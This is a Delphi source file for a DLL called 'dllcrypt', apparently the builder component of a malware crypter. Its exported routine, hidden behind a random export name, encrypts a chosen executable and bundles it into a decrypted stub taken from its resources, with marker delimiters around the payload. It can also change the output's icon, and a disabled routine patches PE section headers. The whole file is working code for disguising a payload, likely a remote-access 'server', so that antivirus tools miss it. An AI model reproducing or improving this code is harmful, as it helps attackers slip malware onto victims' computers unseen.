library dllcrypt;
{$R 'stub.res' 'stub.rc'}
uses
  windows,
  classes,
  resources,
  StubFuncoesDiversas,
  UnitConstantes,
  UnitCryptString,
  UnitMudarIcone;
  
function LerArquivo(FileName: WideString): String;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
  imagem: pointer;
  Tamanho: DWORD;
begin
  result := '';
  imagem := nil;
  hFile := CreateFileW(PWChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  tamanho := GetFileSize(hFile, nil);
  GetMem(imagem, tamanho);
  ReadFile(hFile, imagem^, tamanho, lpNumberOfBytesRead, nil);
  setstring(result, Pchar(imagem), tamanho);
  freemem(imagem, tamanho);
  CloseHandle(hFile);
end;

Procedure CriarArquivo(NomedoArquivo: WideString; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;

begin
  hFile := CreateFileW(PWChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

function Align(dwValue:DWORD; dwAlign:DWORD):DWORD;
begin
  if dwAlign <> 0 then
  begin
    if dwValue mod dwAlign <> 0 then
    begin
      Result := (dwValue + dwAlign) - (dwValue mod dwAlign);
      Exit;
    end;
  end;
  Result := dwValue;
end;

function BuildServer(szStubPath: widestring; SourceFile: String; dwSize: int64): Boolean;
var
  hFile:  DWORD;
  dwNull: DWORD;
  IDH:    TImageDosHeader;
  INH:    TImageNtHeaders;
  ISH:    TImageSectionHeader;
  i:      DWORD;
  dwAligned:  DWORD;
  pBuff1, pBuff2:  Pointer;
  szBuffer:         string;
  pStub:            Pointer;
  dwFileSize:       int64;


  TempStr: string;
  TempInt: int64;
begin
  Result := FALSE;
  TempStr := LerArquivo(szStubPath);
  dwFileSize := Length(TempStr);
  pStub := @TempStr[1];

  IDH := TImageDosHeader(pStub^);
  if IDH.e_magic = IMAGE_DOS_SIGNATURE then
  begin
    INH := TImageNtHeaders(Pointer(DWORD(pStub) + IDH._lfanew)^);
    if INH.Signature = IMAGE_NT_SIGNATURE then
    begin
      TempInt := dwSize + Length(MasterDelimitador) + Length(MasterDelimitador);
      dwAligned := Align(TempInt, INH.OptionalHeader.FileAlignment);

      GetMem(pBuff1, INH.OptionalHeader.SizeOfHeaders);
      GetMem(pBuff2, dwFileSize - INH.OptionalHeader.SizeOfHeaders);

      CopyMemory(pBuff1, pStub, INH.OptionalHeader.SizeOfHeaders);
      CopyMemory(pBuff2, Pointer(DWORD(pStub) + INH.OptionalHeader.SizeOfHeaders), dwFileSize - INH.OptionalHeader.SizeOfHeaders);
      SetLength(szBuffer, dwAligned);

      CopyMemory(@szBuffer[1], @MasterDelimitador[1], Length(MasterDelimitador));
      CopyMemory(@szBuffer[Length(MasterDelimitador) + 1], @SourceFile[1], Length(SourceFile));
      CopyMemory(@szBuffer[Length(MasterDelimitador) + 1 + Length(SourceFile) + 1], @MasterDelimitador[1], Length(MasterDelimitador));

      hFile := CreateFileW(PWChar(szStubPath), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
      if hFile <> INVALID_HANDLE_VALUE then
      begin
        SetFilePointer(hFile, 0, nil, FILE_BEGIN);
        WriteFile(hFile, pBuff1^, INH.OptionalHeader.SizeOfHeaders, dwNull, nil);

        SetFilePointer(hFile, INH.OptionalHeader.SizeOfHeaders, nil, FILE_BEGIN);
        WriteFile(hFile, szBuffer[1], Length(szBuffer), dwNull, nil);

        for i := 0 to INH.FileHeader.NumberOfSections - 1 do
        begin
          ISH := TImageSectionHeader(Pointer(DWORD(pStub) + IDH._lfanew + 248 + i * 40)^);
          ISH.PointerToRawData := ISH.PointerToRawData + dwAligned;
          SetFilePointer(hFile, IDH._lfanew + 248 + i * 40, nil, FILE_BEGIN);
          WriteFile(hFile, ISH, 40, dwNull, nil);
        end;
        SetFilePointer(hFile, 0, nil, FILE_END);
        WriteFile(hFile, pBuff2^, dwFileSize - INH.OptionalHeader.SizeOfHeaders, dwNull, nil);
        CloseHandle(hFile);
        Result := TRUE;
      end;
    end;
  end;
end;

procedure Iniciar(ComputerID: AnsiString; StubFile: WideString; IconFile: WideString = '');
var
  resStream: TResourceStream;
  i, dwindex: integer;
  lpResources: TPEResources;
  FileBuffer, EOFBuffer: string;
  lpdata: Pchar;
  ServerEOFsize: int64;
  TempStr: string;
  Image: Int64;
  CryptedSource: string;
begin
  FileBuffer := LerArquivo(StubFile);
  FileBuffer := MyCryptFunction(FileBuffer, CryptPass);

  resStream := TResourceStream.Create(hInstance, 'STUB', 'stubfile');
  SetLength(CryptedSource, resStream.size);
  resStream.Position := 0;
  resStream.Read(CryptedSource[1], resStream.Size);
  resStream.Free;
  CryptedSource := EnDecryptStrRC4B(CryptedSource, ComputerID);


  CryptedSource := CryptedSource + MasterDelimitador + FileBuffer + MasterDelimitador;


  CriarArquivo(StubFile, CryptedSource, length(CryptedSource));

  if IconFile = '' then
  begin
//    lpResources := TPEResources.Create(AnsiString(StubFile));
//    try
////      for i := 0 to lpResources.GroupCount - 1 do
//      if lpResources.Groups[i].ResourceCount > 0 then for dwindex := lpResources.Groups[i].ResourceCount - 1 downto 0 do
//      lpResources.Remove(lpResources.Groups[i].ResType, lpResources.Groups[i].Resources[dwindex].ResName);
//      finally
//      lpResources.Free;
//    end;
  end else MudarIcone(AnsiString(StubFile), IconFile);

//  BuildServer(StubFile, FileBuffer, Length(FileBuffer));
end;

exports
  Iniciar name 'jkfvndjvnkdnvfslvjkfskdvnkfs';

begin

end.  